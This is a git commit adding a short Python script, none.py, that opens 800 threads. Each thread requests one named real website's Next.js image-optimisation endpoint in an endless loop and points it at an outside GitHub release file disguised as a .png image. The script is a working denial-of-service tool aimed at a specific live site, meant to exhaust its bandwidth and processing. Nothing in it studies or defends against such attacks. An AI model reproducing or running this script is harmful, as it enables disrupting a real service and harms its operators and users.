8d28db5ef6d7b25bc231eaa83f066fa37b85cdb3
ikram <ikram79067@gmail.com>
2025-11-15 13:42:50 -0500

    Create none.py

---
+++ none.py
@@ -0,0 +1,47 @@
+import requests, json, re, threading, time
+
+from urllib3.exceptions import InsecureRequestWarning
+from urllib3 import disable_warnings
+disable_warnings(InsecureRequestWarning)
+
+
+url1 = "https://facethepeople.net"
+url2 = "https://github.com/dulalahmed9701-lang/project-debian/releases/download/v1.1/debian-13.1.0-amd64-netinst.png"
+
+url = url1+"/_next/image?url="+url2+"&w=384&q=75"
+
+
+
+
+
+def req():
+    while True:
+        try:
+            response = requests.get(url)
+            print(response.status_code)
+        except Exception as e:
+            print(e)
+            time.sleep(0.5)
+
+       
+
+
+
+
+def r():
+    total_threads = 800
+    threads = []
+
+    for i in range(total_threads):
+        t = threading.Thread(target=req)
+        threads.append(t)
+        t.start()
+
+    # Wait for all threads to finish
+    for t in threads:
+        t.join()
+
+    print("All threads completed!")
+
+
+r()
